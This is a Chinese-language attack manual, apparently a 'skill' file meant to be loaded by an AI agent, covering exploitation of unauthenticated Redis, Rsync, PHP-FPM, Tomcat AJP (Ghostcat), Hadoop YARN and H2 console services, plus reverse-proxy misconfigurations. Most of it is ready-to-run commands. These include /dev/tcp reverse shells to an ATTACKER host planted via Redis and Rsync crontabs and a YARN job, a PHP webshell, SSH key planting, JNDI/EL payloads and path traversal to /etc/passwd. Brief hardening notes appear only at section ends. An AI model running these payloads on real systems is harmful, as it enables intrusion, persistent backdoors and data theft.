# 技能：未经授权访问常见服务 — 专家攻击手册

> **AI 加载指令**：针对未经身份验证或弱身份验证的管理服务进行利用的专家级技术。涵盖 Redis 写入 RCE、Rsync 数据窃取、PHP-FPM 代码执行、Ghostcat AJP 文件读取、Hadoop YARN 任务提交以及 H2 控制台 JNDI。这些是基础设施级别的发现，与 Web 应用程序漏洞不同。

## 0. 相关路由

- 当这些服务可通过 SSRF 访问时（例如，SSRF → Redis）的 [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md)
- 当 H2 控制台或类似服务接受 JNDI 连接字符串时的 [jndi-injection](../jndi-injection/SKILL.md)
- 当 RMI Registry 或 T3 协议暴露时的 [deserialization-insecure](../deserialization-insecure/SKILL.md)
- 在服务枚举期间进行第 2/3 层攻击的 [network-protocol-attacks](../network-protocol-attacks/SKILL.md)
- 获得命令执行后用于反向 Shell 的 [reverse-shell-techniques](../reverse-shell-techniques/SKILL.md)

### 全面端口参考

当您需要时，也加载 [PORT_SERVICE_MATRIX.md](./PORT_SERVICE_MATRIX.md)：
- 按端口编号组织的完整利用矩阵（20+ 服务）
- 每个服务的枚举、暴力破解和后利用
- 在 nmap/masscan 输出分析期间的快速排查

---

## 1. 发现 — 端口扫描

```bash
nmap -sV -p 6379,873,9000,8009,8088,8082,1099,9200,5984,2375,27017,11211 TARGET

# 关键端口：
# 6379  — Redis
# 873   — Rsync
# 9000  — PHP-FPM (FastCGI)
# 8009  — AJP (Tomcat Ghostcat)
# 8088  — Hadoop YARN ResourceManager
# 8082  — H2 控制台（或嵌入在 Spring Boot 中）
# 1099  — Java RMI Registry
# 9200  — Elasticsearch
# 5984  — CouchDB
# 2375  — Docker API
# 27017 — MongoDB
# 11211 — Memcached
```

---

## 2. REDIS (端口 6379)

### 检测

```bash
redis-cli -h TARGET ping
# 响应：PONG = 确认未经身份验证访问

redis-cli -h TARGET INFO server
# 返回 Redis 版本、操作系统、配置
```

### 写入 SSH 授权密钥

```bash
# 生成密钥对：
ssh-keygen -t rsa -f redis_rsa

# 将公钥写入 Redis，然后转储到 authorized_keys：
cat redis_rsa.pub | redis-cli -h TARGET -x set ssh_key
redis-cli -h TARGET config set dir /root/.ssh
redis-cli -h TARGET config set dbfilename authorized_keys
redis-cli -h TARGET save

# 连接：
ssh -i redis_rsa root@TARGET
```

### 写入 Crontab（反向 Shell）

```bash
redis-cli -h TARGET
> set x "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\n"
> config set dir /var/spool/cron/
> config set dbfilename root
> save
```

### 写入 Webshell

```bash
redis-cli -h TARGET
> set webshell "<?php system($_GET['cmd']); ?>"
> config set dir /var/www/html/
> config set dbfilename shell.php
> save
# 访问：http://TARGET/shell.php?cmd=id
```

### 主从复制 RCE

使用 `redis-rogue-server` 利用主从复制加载恶意 `.so` 模块：

```bash
python3 redis-rogue-server.py --rhost TARGET --lhost ATTACKER
# 通过 SLAVEOF → MODULE LOAD → system.exec 加载模块
```

### 强化

```
requirepass STRONG_PASSWORD
bind 127.0.0.1
protected-mode yes
rename-command CONFIG ""
rename-command FLUSHALL ""
```

---

## 3. RSYNC (端口 873)

### 检测

```bash
rsync TARGET::
# 如果允许匿名访问，将列出可用模块（共享）

rsync -av TARGET::MODULE_NAME /tmp/loot/
# 下载整个模块内容
```

### 利用 — 写入 Crontab

```bash
# 创建反向 Shell Crontab：
echo '*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > /tmp/evil_cron

# 上传到目标的 crontab（如果可写模块映射到 /etc/ 或类似）：
rsync -av /tmp/evil_cron TARGET::MODULE/cron.d/backdoor
```

### 强化

```
# /etc/rsyncd.conf:
auth users = rsync_user
secrets file = /etc/rsyncd.secrets
list = no
hosts allow = 10.0.0.0/8
read only = yes
```

---

## 4. PHP-FPM / FASTCGI (端口 9000)

### 机制

PHP-FPM 监听 FastCGI 请求。如果暴露在网络（而不是 Unix 套接字），攻击者可以发送定制的 FastCGI 数据包来执行任意 PHP 代码。

### 利用

```bash
# 使用 fcgi_exp 或类似工具：
python3 fpm.py TARGET 9000 /var/www/html/index.php -c "<?php system('id'); ?>"

# FastCGI 请求中的关键参数：
# SCRIPT_FILENAME = 任何现有 .php 文件的路径
# PHP_VALUE = "auto_prepend_file = php://input"  （将 POST 正文作为 PHP 代码注入）
# PHP_ADMIN_VALUE = "allow_url_include = On"
```

### 用于利用的关键 FastCGI 环境变量

```text
SCRIPT_FILENAME = /var/www/html/index.php   # 必须指向一个现有的 .php 文件
PHP_VALUE = auto_prepend_file = php://input  # 将 POST 正文作为 PHP 代码注入
PHP_ADMIN_VALUE = allow_url_include = On     # 启用远程包含
```

### 通过 SSRF（gopher）

```
gopher://TARGET:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00...
# 编码的 FastCGI 数据包
# 工具：Gopherus 生成 gopher:// URL
python3 gopherus.py --exploit fastcgi
```

### 强化

```ini
; php-fpm.conf — 仅绑定到套接字：
listen = /var/run/php-fpm.sock
; 如果需要 TCP，限制：
listen.allowed_clients = 127.0.0.1
```

---

## 5. GHOSTCAT — AJP (端口 8009) — CVE-2020-1938

### 机制

Apache JServ Protocol (AJP) 用于反向代理和 Tomcat 之间。AJP 信任所有传入数据 — 攻击者直接连接可以设置 `javax.servlet.include.request_uri` 来读取 Web 应用程序目录中的任意文件。

### 文件读取

```bash
# 使用 ajpShooter 或类似工具：
python3 ajpShooter.py TARGET 8009 /WEB-INF/web.xml read

# 读取 Web 应用程序根目录中的任何文件：
# /WEB-INF/web.xml          — 部署描述符
# /WEB-INF/classes/*.class  — 编译的 Java 类
# /WEB-INF/lib/*.jar        — 库 JAR 文件
```

### 文件包含 → RCE

如果存在文件上传（例如，伪装为图像的上传 JSP），AJP 可以将其作为 JSP 包含：

```bash
python3 ajpShooter.py TARGET 8009 /uploaded_avatar.txt eval
# 如果文件包含 JSP 代码，它将被执行
```

### 强化

```xml
<!-- server.xml — 禁用 AJP 或添加密钥： -->
<Connector port="8009" protocol="AJP/1.3" secretRequired="true" secret="STRONG_SECRET"/>
<!-- 或者完全移除 AJP 连接器 -->
```

---

## 6. HADOOP YARN RESOURCEMANAGER (端口 8088)

### 检测

```bash
curl http://TARGET:8088/cluster
# 如果可访问 → 未经身份验证的 YARN ResourceManager UI
```

### 通过应用程序提交 RCE

```bash
# 提交一个执行命令的 MapReduce 应用程序：
curl -s -X POST http://TARGET:8088/ws/v1/cluster/apps/new-application
# 返回：{"application-id":"application_xxx_0001"}

curl -s -X POST http://TARGET:8088/ws/v1/cluster/apps \
  -H "Content-Type: application/json" \
  -d '{
    "application-id": "application_xxx_0001",
    "application-name": "test",
    "am-container-spec": {
      "commands": {"command": "/bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1"}
    },
    "application-type": "YARN"
  }'
```

### 强化

启用 Kerberos 身份验证；限制管理端口的网络访问。

---

## 7. H2 数据库控制台

### 检测

H2 控制台通常在 Spring Boot 应用程序中通过以下方式启用：
```
spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true
```

访问：`http://TARGET:PORT/h2-console`

### 通过连接字符串进行 JNDI 注入

在 H2 控制台登录表单中，JDBC URL 字段接受 JNDI。

**BeanFactory + EL 绕过**（适用于 Java 8u252+）：

```text
# 登录表单中的 JDBC URL：
javax.naming.InitialContext

# LDAP 响应属性：
javaClassName: javax.el.ELProcessor
javaFactory: org.apache.naming.factory.BeanFactory
forceString: x=eval
x: Runtime.getRuntime().exec("id")
```

另见 [jndi-injection](../jndi-injection/SKILL.md) 以了解完整的 JNDI/BeanFactory 利用流程。

### 通过 RUNSCRIPT 进行 RCE

```sql
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); return "ok"; }';
CALL EXEC('id');
```

---

## 8. 快速参考

```text
# Redis — 检查身份验证：
redis-cli -h TARGET ping

# Redis — 写入 Webshell：
SET x "<?php system($_GET['c']);?>"
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SAVE

# Rsync — 列出模块：
rsync TARGET::

# Ghostcat — 读取 web.xml：
python3 ajpShooter.py TARGET 8009 /WEB-INF/web.xml read

# YARN — 提交 RCE 任务：
curl -X POST http://TARGET:8088/ws/v1/cluster/apps/new-application

# H2 — 通过别名进行 RCE：
CREATE ALIAS EXEC AS '...Runtime.exec...'; CALL EXEC('id');
```

---

## 9. 反向代理配置错误

### Nginx 偏移路径遍历

```nginx
# 漏洞配置：
location /static {
    alias /var/www/static/;
}
# 访问：/static../etc/passwd → 解析为 /var/www/etc/passwd
# 位置缺少尾随斜杠导致路径遍历

# 修复：location /static/（尾随斜杠与别名匹配）
```

### Nginx 缺失根位置

```nginx
# 如果未定义根位置且使用别名：
# 攻击者可能访问 nginx.conf 或其他服务器文件
GET /..%2f..%2fetc/nginx/nginx.conf HTTP/1.1
```

### X-Forwarded-For / X-Real-IP 信任

```
# 如果后端信任这些标题进行基于 IP 的身份验证：
GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# 可能绕过 IP 白名单以访问管理面板
```

### Caddy 模板注入

```
# 启用模板的 Caddy：
# 如果用户输入到达 Caddy 模板渲染：
{{.Req.Host}}          → 信息披露
{{readFile "/etc/passwd"}}  → 通过 Go 模板进行本地文件读取
# 这本质上是通过代理配置进行的 Go 模板注入
```

### 有用工具

- `yandex/gixy` — Nginx 配置分析器
- `Raelize/Kyubi` — 反向代理配置错误扫描器
- `GerbenJavado/bypass-url-parser` — URL 解析器混淆测试器
